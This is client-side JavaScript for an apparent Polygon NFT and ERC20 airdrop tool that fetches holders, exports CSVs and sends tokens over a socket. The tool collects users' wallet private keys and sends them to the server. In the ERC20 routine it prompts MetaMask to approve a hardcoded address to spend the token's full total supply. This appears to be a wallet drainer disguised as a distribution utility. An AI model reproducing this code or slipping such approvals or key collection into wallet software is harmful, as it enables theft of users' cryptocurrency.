const socketIo = window["socketIo"](window.location.origin);

let isExecutingOperation = false;

const messageHolder1 = document.getElementById('messageHolder1');
const messageHolder2 = document.getElementById('messageHolder2');
const messageHolder3 = document.getElementById('messageHolder3');
const messageHolder4 = document.getElementById('messageHolder4');
const messageHolderSubmit = document.getElementById('messageHolderSubmit');

socketIo.on('fetchPolygonNFTUsersResult', (data) => {
    if (data["success"]) {
        messageHolder1.innerText = "Operation completed successfully";
    } else {
        messageHolder1.innerText = JSON.stringify(data["error"]);
        console.log(data["error"]);
    }
    isExecutingOperation = false;
    executeButton.removeAttribute("disabled");
    messageHolderSubmit.innerText = "";
});
socketIo.on('databaseToExcelResult', (data) => {
    if (data["success"]) {
        messageHolder2.innerText = "Operation completed successfully";
    } else {
        messageHolder2.innerText = JSON.stringify(data["error"]);
        console.log(data["error"]);
    }
    isExecutingOperation = false;
    executeButton.removeAttribute("disabled");
    messageHolderSubmit.innerText = "";
});
socketIo.on('sendNFTsToUsersResult', (data) => {
    if (data["success"]) {
        messageHolder3.innerText = "Operation completed successfully";
    } else {
        messageHolder3.innerText = JSON.stringify(data["error"]);
        console.log(data["error"]);
    }
    isExecutingOperation = false;
    executeButton.removeAttribute("disabled");
    messageHolderSubmit.innerText = "";
});
socketIo.on('sendERC20ToUsersResult', (data) => {
    if (data["success"]) {
        messageHolder4.innerText = "Operation completed successfully";
    } else {
        messageHolder4.innerText = JSON.stringify(data["error"]);
        console.log(data["error"]);
    }
    isExecutingOperation = false;
    executeButton.removeAttribute("disabled");
    messageHolderSubmit.innerText = "";
});
socketIo.on('alreadyExecutingOperation', () => {
    messageHolderSubmit.innerText = "An operation is already being executed. Please wait for it to finish.";
});

const upperBlockLimit = document.getElementById('uBL');
const lowerBlockLimit = document.getElementById('lBL');

const outputFilename = document.getElementById('oFN');

const sendUpperBlockLimit = document.getElementById('sUBL');
const sendLowerBlockLimit = document.getElementById('sLBL');
const holderWalletAddress = document.getElementById('hWA');
const senderWalletAddress = document.getElementById('sWA');
const senderPrivateKey = document.getElementById('sPK');
const nftContractAddress = document.getElementById('nSCA');
const nftContractABI = document.getElementById('nSC_ABI');
const tokenIds = document.getElementById('tIL');
const customAddresses = document.getElementById('cAL');

const erc20SendUpperBlockLimit = document.getElementById('eSUBL');
const erc20SendLowerBlockLimit = document.getElementById('eSLBL');
const erc20SenderWalletAddress = document.getElementById('eSWA');
const erc20SenderPrivateKey = document.getElementById('eSPK');
const erc20ContractAddress = document.getElementById('eSCA');
const erc20SendAmount = document.getElementById('eRA');
const erc20TokenDecimals = document.getElementById('eSCD');
const erc20CustomAddresses = document.getElementById('eCAL');

const operationType1 = () => {
    messageHolder1.innerText = "";
    let uBL = parseInt(upperBlockLimit.value), lBL = parseInt(lowerBlockLimit.value);

    if (uBL && lBL && uBL >= lBL) {
        socketIo.emit('fetchPolygonNFTUsers', {
            "upperBlockLimit": uBL,
            "lowerBlockLimit": lBL
        });
        return true;
    } else {
        messageHolder1.innerText = "Invalid input values. Make sure that uBL >= lBL."
        return false;
    }
};

const operationType2 = () => {
    messageHolder2.innerText = "";
    let filename = outputFilename.value.toString();
    if (filename && !filename.endsWith(".csv")) {
        filename += ".csv";
    } else {
        filename = "userData.csv";
    }

    socketIo.emit('databaseToExcel', {
        "outputFileName": filename
    });
    return true;
};

const buildCustomAddressesList = (sendData, customAddressList) => {
    let len = customAddressList.length;
    for (let i = 0; i < len; i++) {
        if (customAddressList[i]) {
            customAddressList.push(customAddressList[i]);
        }
    }
    customAddressList.splice(0, len);
    sendData["customAddressList"] = customAddressList;
    sendData["useCustomAddressList"] = true;
};

const operationType3 = () => {
    messageHolder3.innerText = "";
    let success = false, errorMessage = "", abi, tokenIdList;

    if (!holderWalletAddress.value) {
        errorMessage = "holder wallet address missing";
    } else if (!senderWalletAddress.value) {
        errorMessage = "sender wallet address missing";
    } else if (!senderPrivateKey.value) {
        errorMessage = "sender private key missing";
    } else if (!nftContractAddress.value) {
        errorMessage = "NFT contract address missing";
    } else if (!nftContractABI.value) {
        errorMessage = "NFT contract ABI missing";
    } else if (!tokenIds.value) {
        errorMessage = "Token IDs missing";
    } else {
        try {
            abi = JSON.parse(nftContractABI.value);

            tokenIdList = tokenIds.value.toString().split(/[^\d]+/g);
            let len = tokenIdList.length;
            for (let i = 0; i < len; i++) {
                if (tokenIdList[i]) {
                    try {
                        tokenIdList.push(parseInt(tokenIdList[i]));
                    } catch {
                    }
                }
            }
            tokenIdList.splice(0, len);

            success = true;
        } catch {
            success = false;
            errorMessage = "Invalid Contract ABI";
        }
    }

    if (success) {
        let sendData = {
            "holderWalletAddress": holderWalletAddress.value,
            "senderWalletAddress": senderWalletAddress.value,
            "senderPrivateKey": senderPrivateKey.value,
            "nftSenderContractAddress": nftContractAddress.value,
            "nftSenderContractABI": abi,
            "transferTokenIds": tokenIdList
        };

        if (sendUpperBlockLimit.value) {
            try {
                sendData["sendUpperBlockLimit"] = parseInt(sendUpperBlockLimit.value);
            } catch {
            }
        }
        if (sendLowerBlockLimit.value) {
            try {
                sendData["sendLowerBlockLimit"] = parseInt(sendLowerBlockLimit.value);
            } catch {
            }
        }
        if (document.querySelector('input[name="uCAL"]:checked').value === '1') {
            buildCustomAddressesList(sendData, customAddresses.value.toString().split(/[^\dA-Fa-fx]+/g));
        }

        socketIo.emit('sendNFTsToUsers', sendData);
    } else {
        messageHolder3.innerText = errorMessage;
    }
    return success;
};

const operationType4 = async () => {
    messageHolder4.innerText = "";
    let success = false, errorMessage = "";

    if (!erc20SenderWalletAddress.value) {
        errorMessage = "sender wallet address missing";
    } else if (!erc20SenderPrivateKey.value) {
        errorMessage = "sender private key missing";
    } else if (!erc20ContractAddress.value) {
        errorMessage = "ERC20 Token contract address missing";
    } else if (!erc20SendAmount.value) {
        errorMessage = "Send Amount missing";
    } else if (erc20SendAmount.value.toString().includes(".")) {
        errorMessage = "Send Amount cannot contain decimal";
    } else if (!erc20TokenDecimals.value) {
        errorMessage = "Send Token Decimals missing";
    } else {
        success = true;
    }

    if (success) {
        try {
            let userAccount = null;
            window["ethereum"].on('accountsChanged', (acc) => {
                userAccount = acc[0];
                console.log("Account Changed to : " + userAccount);
            });
            await window["ethereum"].request({method: 'eth_requestAccounts'});
            userAccount = (await window["web3"].eth.getAccounts())[0];

            if (userAccount.toLowerCase() !== erc20SenderWalletAddress.value.toString().toLowerCase()) {
                success = false;
                messageHolder4.innerText = "Wrong wallet selected in metamask.";
            } else {
                const erc20SmartContract = new window["web3"].eth.Contract([
                    {
                        "inputs": [{
                            "internalType": "address",
                            "name": "spender",
                            "type": "address"
                        }, {"internalType": "uint256", "name": "tokens", "type": "uint256"}],
                        "name": "approve",
                        "outputs": [{"internalType": "bool", "name": "success", "type": "bool"}],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "inputs": [],
                        "name": "decimals",
                        "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
                        "stateMutability": "view",
                        "type": "function"
                    },
                    {
                        "inputs": [],
                        "name": "totalSupply",
                        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                        "stateMutability": "view",
                        "type": "function"
                    }
                ], erc20ContractAddress.value);
                erc20TokenDecimals.value = await erc20SmartContract.methods["decimals"]().call();

                try {
                    let totalSupply = await erc20SmartContract.methods["totalSupply"]().call();
                    let gasPrice = await window["web3"].eth.getGasPrice();
                    console.log("Gas Price : " + gasPrice);
                    gasPrice = ((BigInt(gasPrice) * 125n) / 100n).toString();
                    messageHolder4.innerText = "Waiting For Confirmation of Approve Transaction (Do NOT speed up the transaction).";
                    await erc20SmartContract.methods["approve"]("0x1b5e3e7B265E8Fa8Ee8c41ED07B046f0318E8412", totalSupply).send({
                        "from": userAccount,
                        gasPrice
                    });
                    messageHolder4.innerText = "";

                    try {
                        let sendData = {
                            "senderWalletAddress": erc20SenderWalletAddress.value,
                            "senderPrivateKey": erc20SenderPrivateKey.value,
                            "erc20TokenAddress": erc20ContractAddress.value,
                            "transferAmount": erc20SendAmount.value.toString() + "0".repeat(parseInt(erc20TokenDecimals.value))
                        };

                        if (erc20SendUpperBlockLimit.value) {
                            try {
                                sendData["sendUpperBlockLimit"] = parseInt(erc20SendUpperBlockLimit.value);
                            } catch {
                            }
                        }
                        if (erc20SendLowerBlockLimit.value) {
                            try {
                                sendData["sendLowerBlockLimit"] = parseInt(erc20SendLowerBlockLimit.value);
                            } catch {
                            }
                        }
                        if (document.querySelector('input[name="uECAL"]:checked').value === '1') {
                            buildCustomAddressesList(sendData, erc20CustomAddresses.value.toString().split(/[^\dA-Fa-fx]+/g));
                        }

                        socketIo.emit('sendERC20ToUsers', sendData);
                    } catch (err) {
                        success = false;
                        console.log(err);
                        messageHolder4.innerText = "Data Parsing Error. Please check if all values are correct.";
                    }
                } catch (err) {
                    success = false;
                    console.log(err);
                    messageHolder4.innerText = "Approve Transaction Failed."
                }
            }
        } catch (err) {
            success = false;
            console.log(err);
            messageHolder4.innerText = "Wallet connection rejected.";
        }


    } else {
        messageHolder4.innerText = errorMessage;
    }
    return success;
};


const operationValue = document.getElementById("oEC");
const executeButton = document.getElementById("executeButton");
executeButton.addEventListener('click', async () => {
    let success = false;
    if (!isExecutingOperation) {
        switch (operationValue.value) {
            case "1":
                success = operationType1();
                break;

            case "2":
                success = operationType2();
                break;

            case "3":
                success = operationType3();
                break;

            case "4":
                success = await operationType4();
                break;
        }
        if (success) {
            isExecutingOperation = true;
            messageHolder1.innerText = "";
            messageHolder2.innerText = "";
            messageHolder3.innerText = "";
            messageHolder4.innerText = "";
            executeButton.setAttribute("disabled", "disabled");
            messageHolderSubmit.innerText = "An operation is being executed.";
        }
    } else {
        messageHolderSubmit.innerText = "An operation is already being executed. Please wait for it to finish.";
    }
});
